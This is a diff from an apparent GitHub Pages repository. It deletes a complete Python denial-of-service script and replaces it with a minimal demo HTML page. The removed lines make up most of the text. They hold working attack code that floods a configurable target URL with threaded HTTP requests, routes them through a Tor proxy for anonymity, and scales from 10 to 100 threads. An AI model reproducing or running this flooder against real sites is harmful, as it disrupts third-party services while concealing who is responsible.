@@ -1,77 +1,12 @@
-import requests
-import threading
-import time
-import signal
-from dotenv import load_dotenv
-import os
-
-# Load environment variables from .env file
-load_dotenv()
-
-# Target URL from environment variable
-target_url = os.getenv("TARGET_URL")
-
-# Tor proxy settings
-proxies = {
-    'http': 'socks5h://localhost:9050',
-    'https': 'socks5h://localhost:9050'
-}
-
-# Flag to control the running state of the threads
-running = True
-
-# Function to send requests
-def send_requests():
-    global running
-    try:
-        while running:
-            response = requests.get(target_url, proxies=proxies)
-            print(f"Request sent, status code: {response.status_code}")
-            time.sleep(0.1)  # Slight delay to reduce overwhelming the target immediately
-    except Exception as e:
-        print(f"Error: {e}")
-
-# Function to gradually scale up the attack
-def gradual_dos_attack(initial_threads, max_threads, step, delay):
-    global running
-    current_threads = initial_threads
-    while current_threads <= max_threads and running:
-        threads = []
-        print(f"Starting attack with {current_threads} threads")
-        for i in range(current_threads):
-            thread = threading.Thread(target=send_requests)
-            thread.start()
-            threads.append(thread)
-
-        # Join threads to wait for completion (you can skip this if you want a continuous attack)
-        for thread in threads:
-            thread.join()
-
-        time.sleep(delay)  # Wait before scaling up
-        current_threads += step
-
-# Signal handler for graceful shutdown
-def signal_handler(sig, frame):
-    global running
-    print('Stopping the attack...')
-    running = False
-
-if __name__ == "__main__":
-    # Set up signal handler for graceful shutdown
-    signal.signal(signal.SIGINT, signal_handler)
-    signal.signal(signal.SIGTERM, signal_handler)
-
-    # Initial number of threads
-    initial_threads = 10
-
-    # Maximum number of threads
-    max_threads = 100
-
-    # Step to increase the number of threads
-    step = 10
-
-    # Delay between scaling steps in seconds
-    delay = 30
-
-    gradual_dos_attack(initial_threads, max_threads, step, delay)
-    print('Attack stopped.')
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Demo Website</title>
+</head>
+<body>
+    <h1>Welcome to the Demo Website</h1>
+    <p>This is a simple GitHub Pages site for testing purposes.</p>
+</body>
+</html>
